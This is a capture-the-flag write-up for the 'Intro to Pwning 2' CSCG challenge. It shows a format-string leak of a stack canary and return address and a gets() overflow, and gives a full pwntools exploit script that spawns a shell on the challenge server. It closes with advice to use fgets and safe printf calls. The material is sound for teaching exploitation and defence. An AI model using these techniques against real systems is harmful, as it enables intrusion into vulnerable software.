# Intro to Pwning 2

When run, the binary first asks us for the password of stage 1.
It then asks for our witch name, which it then prints back to us and then asks us for a magic spell:
```
$ ./pwn2
Enter the password of stage 1:
CSCG{...}
Enter your witch name:
Hermione
┌───────────────────────┐
│ You are a Revenclaw!  │
└───────────────────────┘
Hermione enter your magic spell:
Expelliarmus
~ Protego!
```

Looking at the code we can quickly find two vulnerabilities:
1. All user input is read using the `gets` function, which doesn't have a length limit for the input and can therefore be used for buffer overflows.
2. The binary uses `printf` directly to print the entered name, which among other things allows us to leak data from the stack.

We can also find an unused function `WINgardium_leviosa` which opens a shell:
```cpp
void WINgardium_leviosa() {
    printf("┌───────────────────────┐\n");
    printf("│ You are a Slytherin.. │\n");
    printf("└───────────────────────┘\n");
    system("/bin/sh");
}
```

Looking at the `checksec` output we can see that the binary has everything enabled:
```
$ checksec pwn2
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Because there is a stack canary we can't simply use `gets` to overwrite the return address and jump to `WINgardium_leviosa` but
we can use `printf` to first leak the canary and at the same time find out the base address of the binary to circumvent `PIE`.
Then we can use the second `gets` to overwrite the return address and leave the canary. Because `gets` reads until newlines it also isn't a problem that the canary includes null-bytes.

Using `gdb` and `pwndbg` we can find out that the canary is at position `33` and the return address is at `35` on the stack when `printf` is called in `welcome`:
```
pwndbg> disass welcome
...
   0x0000000000000ce3 <+109>:   call   0x8a0 <printf@plt>
...
pwndbg> b *welcome+109
pwndbg> r
pwndbg> canary
AT_RANDOM = 0x7ffffffee4d8 # points to (not masked) global canary value
Canary    = 0xde09d8f9285a0c00
Found valid canaries on the stacks:
00:0000│   0x7ffffffee028 ◂— 0xde09d8f9285a0c00
pwndbg> stack 50
...
21:0108│          0x7ffffffee028 ◂— 0xde09d8f9285a0c00
22:0110│ rbp      0x7ffffffee030 —▸ 0x7ffffffee050 ◂— 0x0
23:0118│          0x7ffffffee038 —▸ 0x8000dc5 (main+55) ◂— mov    eax, 0 /* 0xff30e800000000b8 */
...
pwndbg> pi 0x21
33
```

Because `printf`'s first six variadic arguments are taken from registers we can leak the canary and return address using `%39$p %41$p` i.e. printing the 39th and 41st arguments to `printf` as pointers which will be the 33rd and 35th value on the stack:

```
Enter your witch name:
%39$p %41$p
┌───────────────────────┐
│ You are a Ravenclaw!  │
└───────────────────────┘
0x444db24d43e12200 0x7f2edd400dc5 enter your magic spell:
```

Taking another look with `gdb` we can also find out the offset between the return address and the `WINgardium_leviosa` function:
```
pwndbg> disass welcome
...
   0x0000000000000cfe <+136>:   ret
...
pwndbg> b *welcome+136
pwndbg> r
pwndbg> stack 1
00:0000│ rsp  0x7ffffffee038 —▸ 0x8000dc5 (main+55) ◂— mov    eax, 0 /* 0xff30e800000000b8 */
pwndbg> p WINgardium_leviosa
$1 = {<text variable, no debug info>} 0x8000b94 <WINgardium_leviosa>
pwndbg> pi 0x8000dc5 - 0x8000b94
561
```

and the offset between the buffer and the canary and return address for the second `gets`, which is `0x108` and `0x118` bytes:
```
pwndbg> disass AAAAAAAA
...
   0x0000000008000d34 <+53>:    call   0x8000900 <gets@plt>
   0x0000000008000d39 <+58>:    lea    rax,[rbp-0x110]
...
pwndbg> b *AAAAAAAA+58
pwndbg> c
Hermione enter your magic spell:
AAAAAAAA
pwndbg> stack 50
00:0000│ rax r8 r10 r11 rsp  0x7ffffffedf20 ◂— 'AAAAAAAA'
...
21:0108│                     0x7ffffffee028 ◂— 0xf4520a17440a6500
22:0110│ rbp                 0x7ffffffee030 —▸ 0x7ffffffee050 ◂— 0x0
23:0118│                     0x7ffffffee038 —▸ 0x8000dcf (main+65) ◂— nop     /* 0x841f0f2e66c3c990 */
```

We also have to start the input for the second `gets` with `"Expelliarmus\0"` because the program
compares the spell we give it and immediately exits if it's not `"Expelliarmus"`.
Luckily `strcmp` stops at null-bytes but `gets` reads until newlines so this is not a problem.

Trying the exploit will now give a `segfault` in `system` because of a misaligned stack
but we can just jump one instruction later into `WINgardium_leviosa` which will skip a `push`
instruction and align the stack correctly.

The final exploit now looks like this:
```python
##!/usr/bin/env python3

from pwn import *

PASSWORD = "CSCG{NOW_PRACTICE_MORE}"
WIN_ADDR = 0xb95
WELCOME_RET = 0xdc5

p = remote("hax1.allesctf.net", 9101)

p.recvuntil("Enter the password of stage 1:\n")
p.sendline(PASSWORD)

p.recvuntil("Enter your witch name:")
p.sendline("#%39$llu|%41$llu#")

p.recvuntil("#")
canary, ret_addr = map(int, p.recvuntil("#")[:-1].split(b"|"))

log.info(f"Leaked stack canary: {canary:#x}")
log.info(f"Leaked ret address: {ret_addr:#x}")

p.recvuntil(":")

ret_addr -= WELCOME_RET

payload = b"Expelliarmus\0".ljust(0x108)
payload += p64(canary)
payload += b"A" * 8
payload += p64(ret_addr + WIN_ADDR)

p.sendline(payload)
p.interactive()
```

And running it gives us a shell and the flag:
```
$ ./exploit.py
[+] Opening connection to hax1.allesctf.net on port 9101: Done
[*] Leaked stack canary: 0x213134df85335a00
[*] Leaked ret address: 0x56318aa0edc5
[*] Switching to interactive mode

~ Protego!
┌───────────────────────┐
│ You are a Slytherin.. │
└───────────────────────┘
$ cat flag
CSCG{NOW_GET_VOLDEMORT}
```

Clearly, it's better to follow the `man`-pages advice and `Never use gets(). [...] Use fgets() instead.`
And of course, letting users control the first argument of `printf` is equally bad.
Instead, `printf("%s", user_input)` should be used. Otherwise, even stack canaries can't help.
